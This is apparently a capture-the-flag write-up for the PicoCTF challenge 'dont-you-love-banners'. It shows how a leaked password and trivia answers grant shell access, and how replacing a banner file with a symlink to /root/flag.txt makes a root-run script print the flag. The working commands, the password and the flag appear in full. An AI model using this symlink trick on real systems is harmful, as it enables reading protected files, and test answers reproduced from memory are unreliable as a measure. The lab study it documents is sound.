---
title: "dont-you-love-banners"
description: "Can you abuse the banner?"
pubDate: 2025-03-06
ctf: "PicoCTF"
category: "general skill"
author: "sclux7"
section: "PicoCTF"
tags: ["medium"]
---

# Understanding the challenge

We can use `nc` to connect to the two addresses. The first has leaked a password that we can use when we connect to the second address.
Connecting to the second address prompts us with questions three that we must answer before being granted access to the server.
- What is the password?
`My_Passw@rd_@1234`
- What is the top cyber security conference in the world?
Some light googling allows us to divine the answer is "DEF CON"
- the first hacker ever was known for phreaking(making free phone calls), who was it?
Some further googling reveals the answer is `john draper`

Once we are in the server we can look around.

If we use `ls -la`, we find we have two files: `banner` and `text`
Using `cat`, we see that the banner file contains the banner that we saw at the start of the challenge when initially connecting to the server. The text file simply has the text: "keep digging".

We do exactly that. We can use `ls /` to view the contents of the `/` folder, and `ls /root/` to see if we can read into the root folder.

We can see `script.py` and `flag.txt`. Attempting to `cat /root/flag.txt` yields a permission denied, so lets `cat /root/script.py`.

`script.py` creates the opening questions when we connect to the server, and importantly has this line:
```python
with open("/home/player/banner", "r") as f:
        print(f.read())
```

After looking up symlinks (thanks to hint 1), we understand they are shortcuts to other files.

With this in mind, we can remove banner from our current directory and recreate it but as a symlink.

# Method
`rm -rf banner`

`ln -s /root/flag.txt banner`

Now, we can test if this worked. Let's leave the server and `nc` again.

Lo and behold, we get the following:

```
$ nc tethys.picoctf.net 62167
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}

what is the password?
```

Flag: `picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}`